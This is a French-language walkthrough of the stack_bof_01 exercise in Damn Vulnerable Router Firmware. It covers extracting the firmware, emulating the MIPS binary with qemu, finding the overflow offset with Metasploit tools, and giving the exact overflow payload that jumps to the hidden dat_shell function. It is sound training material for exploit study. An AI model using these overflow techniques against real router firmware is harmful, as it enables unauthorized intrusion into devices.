
DVRF (Damn Vulnerable Router Firmware) est un outil disponible sur github:

* https://github.com/praetorian-inc/DVRF

C'est un firmware vulnerable contenant differentes vulnérabilités. 

Commençons par vérifier si le firmware (DVRF_v03.bin) est analysable en utilisant __binwalk__ (https://github.com/ReFirmLabs/binwalk):

```
$ binwalk DVRF_v03.bin
binwalk DVRF_v03.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             BIN-Header, board ID: 1550, hardware version: 4702, firmware version: 1.0.0, build date: 2012-02-08
32            0x20            TRX firmware header, little endian, image size: 7753728 bytes, CRC32: 0x436822F6, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x192708, rootfs offset: 0x0
60            0x3C            gzip compressed data, maximum compression, has original file name: "piggy", from Unix, last modified: 2016-03-09 08:08:31
1648424       0x192728        Squashfs filesystem, little endian, non-standard signature, version 3.0, size: 6099215 bytes, 447 inodes, blocksize: 65536 bytes, created: 2016-03-10 04:34:22
```

On remarque alors qu'il existe un système de fichier: __squashfs__. Il existe différente type de système de fichier en ce qui concerne les systèmes embarqués. Les plus connus sont:

* squasfs
* cramfs
* jffs2
* yaffs2
* ext2

Souvent les systèmes de fichiers sont compressés. Les algorithmes de compréssion les plus souvent utilisés sont:

* LZMA
* Gzip
* Zip
* Zlib
* ARJ

Dans le cas présent, le système de fichier (squashfs) n'est pas compressé.

On va utilisé __binwalk__ pour extraire le système de fichier et pouvoir naviguer dedans:

```
$ binwalk -eM DVRF_v03.bin

Scan Time:     2021-06-25 08:53:19
Target File:   /home/shellchocolat/DVRF/Firmware/DVRF_v03.bin
MD5 Checksum:  c08eed9874a26464dc9962791af5831b
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             BIN-Header, board ID: 1550, hardware version: 4702, firmware version: 1.0.0, build date: 2012-02-08
32            0x20            TRX firmware header, little endian, image size: 7753728 bytes, CRC32: 0x436822F6, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x192708, rootfs offset: 0x0
60            0x3C            gzip compressed data, maximum compression, has original file name: "piggy", from Unix, last modified: 2016-03-09 08:08:31
1648424       0x192728        Squashfs filesystem, little endian, non-standard signature, version 3.0, size: 6099215 bytes, 447 inodes, blocksize: 65536 bytes, created: 2016-03-10 04:34:22


Scan Time:     2021-06-25 08:53:20
Target File:   /home/shellchocolat/DVRF/Firmware/_DVRF_v03.bin-0.extracted/piggy
MD5 Checksum:  1fab89cd8929471441d4130a1c2cf477
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1629710       0x18DE0E        PGP RSA encrypted session key - keyid: 801010 BF8F53 RSA (Encrypt or Sign) 1024b
1629774       0x18DE4E        PGP RSA encrypted session key - keyid: 801010 BF8F83 RSA (Encrypt or Sign) 1024b                                                                                                   
3076096       0x2EF000        Linux kernel version 2.6.22                                                                                                                                                        
3108912       0x2F7030        CRC32 polynomial table, little endian                                                                                                                                              
3123228       0x2FA81C        CRC32 polynomial table, little endian                                                                                                                                              
3319864       0x32A838        Unix path: /usr/gnemul/irix/                                                                                                                                                       
3322560       0x32B2C0        Unix path: /usr/lib/libc.so.1                                                                                                                                                      
3422799       0x343A4F        Neighborly text, "NeighborSolicitsts"                                                                                                                                              
3422823       0x343A67        Neighborly text, "NeighborAdvertisementsmp6OutDestUnreachs"                                                                                                                        
3423024       0x343B30        Neighborly text, "NeighborSolicitsirects"                                                                                                                                          
3423052       0x343B4C        Neighborly text, "NeighborAdvertisementssponses"                                                                                                                                   
3425755       0x3445DB        Neighborly text, "neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)" 
```

L'option __-e__ permet d'extraire, et l'option __-M__ permet de le faire de manière récursive (Matryoshka: les poupées russes).

On obtient alors un système de fichier qui s'appelle __squashfs-root__ qui contient:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_08-57.png)

Lorsque l'on regarde dans le dossier __pwnable__ on y trouve différents exercices avec un __README__ donnant les directives:

```
➜  _DVRF_v03.bin.extracted git:(master) ✗ tree squashfs-root/pwnable 
squashfs-root/pwnable
├── Intro
│   ├── core
│   ├── heap_overflow_01
│   ├── linux_server64
│   ├── README
│   ├── stack_bof_01
│   └── uaf_01
└── ShellCode_Required
    ├── README
    ├── socket_bof
    ├── socket_cmd
    └── stack_bof_02
```

Dans cet article, on va donc commencer par le 1er qui se trouve être __Intro/stack_bof_01__.

Regardons ce qu'est cet executable:
```
➜  Intro git:(master) ✗ file stack_bof_01
stack_bof_01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped
```

On voit qu'il s'agit d'un executable __MIPS__, __little endien__ (LSB) qui est dynamiquement lié. Le fait qu'il soit dynamiquement lié est important, on le verra ensuite.

On a affaire à un executable MIPS, ce n'est donc pas la même architecture que mon linux Intel que j'utilise. Il faut donc émuler l'architecture MIPS pour pouvoir exécuter ce binaire. J'utilise pour cela __qemu-mipsel-static__. Le __el__ est significatif de __little endien__ et le static précise que le binaire qemu est compilé statiquement, c'est-à-dire qu'il embarque toutes les librairies dont il a besoin pour fonctionner. Lorsque je tente de l'exécuter (j'ai auparavant copier le binaire __qemu-mipsel-static__ dans le système de fichier), j'obtiens:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-06.png)

On voit qu'il manque la librairie __ld-uClibc.so.0__. Et en effet, elle n'est pas présente sur mon système. En revanche, elle est présente dans le système de fichier du firmware comme on peut le voir ci-desssous:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-08.png)

Ceci est du au fait que le binaire __stack_bof_01__ est compilé dynamiquement et qu'il a donc besoin de la librairie __ld-uClibc.so.0__ pour fonctionner. Il faut donc __ch__anger le répertoire __root__ en utilisant la commande __chroot__ de manière à ce que __stack_bof_01__ "croit" qu'il se trouve bien sur son système MIPS et qu'il puisse accéder à la librairie  __ld-uClibc.so.0__. Comme on __chroot__, on change la racine et c'est pourquoi il est important que le binaire __qemu-mipsel__ soit __static__ de manière à ne pas avoir besoin de dépendance (qui ne seront évidement pas disponible dans l'environnement __chrooté__).

En l'exécutant, on obtient:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-12.png)

Le binaire fonctionne correctement. On voit qu'il faut lui passer un argument (__AAAA__):

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-13.png)

Si je lui passe beacoup de __A__, j'obtiens:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-15.png)

C'est une erreur de type __seg fault__. C'est bon signe, cela veut dire que j'arrive à faire quelque chose qui n'est pas souhaité. Il va falloir débugger pour voir le problème.

Je vais générer une chaine de charactères qui me permettra de ré-écrire un pointeur en particulier: __PC__. (Program Counter, analogue __RIP__/__EIP__ de l'architecture Intel). Pour cela j'utilise un outil de metasploit (je suis sur Kali) qui se trouve dans __/usr/share/metasploit-framework/tools/exploit__:
```
$ ./pattern_create.rb -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

Maintenant que j'ai ma chaine de charactères uniques, il faut que je puisse débugger mon process virtualisé de manière à constater les valeurs présentes dans les registres.

Pour cela, je vais utiliser __IDA__. Je charge le binaire dans __IDA__ en lui spécifiant l'architecture MIPS. Il y a peu de fonctions, et on trouve la fonction __strcpy()__ (vulnérable) dans la table des imports et la fonction __dat_shell__ (fonction qu'il faut appelé pour valider l'exercice et qui se trouve à l'adresse __0x00400950__) dans la table des exports:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-26.png)

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-27.png)

Lorsque je regarde qu'elles sont les fonctions qui font référence à __dat_shell__, je me rend compte qu'il n'y en a aucune:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-27_1.png)

Pour débugger un process lancé par __qemu__, il faut lui spécifier un port de debug avec l'option __-g__:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_09-29.png)

Puis je dois récupérer un serveur de debug fournis par __IDA__. Il se trouve dans le dossier "C:\Program Files\IDA 7.0\dbgsrv" et il s'appelle __linux_server64__. Il me permettra de récupérer le contenu fournis par __qemu__ sur le port __12345__ et de le transférer à __IDA__:

```
$ ./linux_server64 -p 12345
IDA Linux 64-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017
Listening on 0.0.0.0:0...

```

Il suffit alors à spécifer à __IDA__ que je veux écouter sur le port __12345__ et de lancer le debugging. J'obtiens alors mon seg fault

Je vois que le __PC__ contient __Ag8A__. Il faut alors que je détermine l'offset auquel se trouve cette valeur dans la chaine de charactères que j'ai passé à __stack_bof_01__. J'utilise alors un autre outil fourni par metasploit:

```
$ ./pattern_offset.rb -l 300 -q Ag8A
[*] Exact match at offset 204
```

Il faut donc que j'écrive __204__ charactères aléatoires puis que j'écrive une addresse en little endien (celle de __dat_shell__) de manière à jumper sur cette fonction car __PC__ pointera alors vers l'adresse de __dat_shell__ (__0x00400950__):

```
AAAA..(204)..AAA [adresse de dat_shell]

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`echo -e '\\x50\\x09\\x40\\x00'`
```

Bon en pratique, il ne faut pas tout à faire mettre __0x00400950__. Au début de la fonction __dat_shell()__ se trouve 2 instructions qui peuvent poser problème:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_10-14.png)

Le registre __gp__ pointe vers une __global area__ (une heap) qui contient les constantes et variables globales. On voit que le code spécifie cette zone (0x48380), puis qu'il ajoute le contenu du registre temporaire __t9__. Ce registre a été modifié ... Il faut donc faire pointer notre payload juste après, soit à l'adresse __0x0040095C__ afin d'obtenir notre reverse shell:

![image alt text](/images/dvrf-stack-overflow/2021-06-25_10-20.png)

